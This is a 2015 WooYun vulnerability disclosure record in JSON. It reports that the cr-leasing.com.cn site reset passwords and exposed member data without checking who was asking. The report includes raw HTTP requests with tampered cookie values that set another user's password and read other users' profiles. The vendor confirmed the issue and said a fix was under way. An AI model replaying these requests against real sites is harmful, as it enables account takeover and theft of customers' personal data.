{"id": 71197, "wybug_id": "wooyun-2015-0144404", "wybug_title": "华润资产旗下业务网站可任意重置用户密码/获取其客户信息", "wybug_corp": "crland.com.hk", "wybug_author": "换个昵称", "wybug_date": "2015-10-03 13:09", "wybug_open_date": "2015-11-22 09:04", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "敏感接口未加权限认证", "越权操作"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： 用户账户裸奔，你可是华润呀 详细说明：  华润租赁有限公司http://www.cr-leasing.com.cn/第一步：首先我注册了个用户member2015 密码member2022第二步：通过密码找回功能寻找规律，最终发现了第三部重置密码时候的接口认证基于没有，只有个cookie对应的id来表示客户信息。 \nPOST /Ajax/Ft/RequestInfo.ashx HTTP/1.1Host: www.cr-leasing.com.cnConnection: keep-aliveContent-Length: 37Accept: */*Origin: http://www.cr-leasing.com.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.cr-leasing.com.cn/member/ResetPassword2.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=1r155s451ed0hn450y051wvj;dt_temp=60_type=setpassword&password=member2022\n通过这个基本可以断定，这里面有可胜之机。第三步：找一些攻击目标来证明猜想。在用户信息里面，去查找一些资料，发现也是没有权限验证的，谁的信息都可以读取 \nGET /Member/PersonData.aspx HTTP/1.1Host: www.cr-leasing.com.cnConnection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36Referer: http://www.cr-leasing.com.cn/Member/PersonData.aspxAccept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=1r155s451ed0hn450y051wvj; hr=mid=1&em=113645799@qq.com&nc=member2015&state=2\n第四步：重置密码接口重置那些测试账号，发现可以登录。。。。   漏洞证明：  \n\n\n\n\n\n   修复方案：  1.接口进行权限验证   版权声明：转载请注明来源 换个昵称@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-10-08 09:04 厂商回复： 感谢，正在修复，多谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}